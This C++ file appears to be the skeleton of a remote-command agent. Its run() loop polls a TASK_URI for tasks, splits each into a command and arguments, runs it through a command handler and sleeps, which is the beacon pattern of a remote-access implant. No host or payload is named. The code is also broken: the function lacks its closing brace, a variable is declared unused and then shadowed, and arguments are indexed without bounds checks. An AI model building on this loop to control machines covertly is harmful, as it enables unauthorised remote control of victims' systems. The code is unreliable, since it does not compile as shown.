#include "Agent.h"


// @TODO add dependancy injection with IoC container.
Agent::Agent() {

}

void Agent::Register() const {


}


void Agent::run() const{
	Register();

	std::vector<std::string> task = util::split("");


	while (true) {
		std::string task = Request.Get(TASK_URI);
		Ping();

		if (task != "") {
			std::vector <std::string> Task = util::split(task);
			std::vector <std::string> args;
			args = std::vector<std::string>(Task.begin() + 1, Task.end()); // @todo check if Task has more than 1

			std::string Cmd = Task[0];

			if (cmdHandler.HasCommand(Cmd)) {
				cmdHandler.ExecuteCommand(Cmd, args);
			}
		}

		Sleep(SLEEP_TIME);

}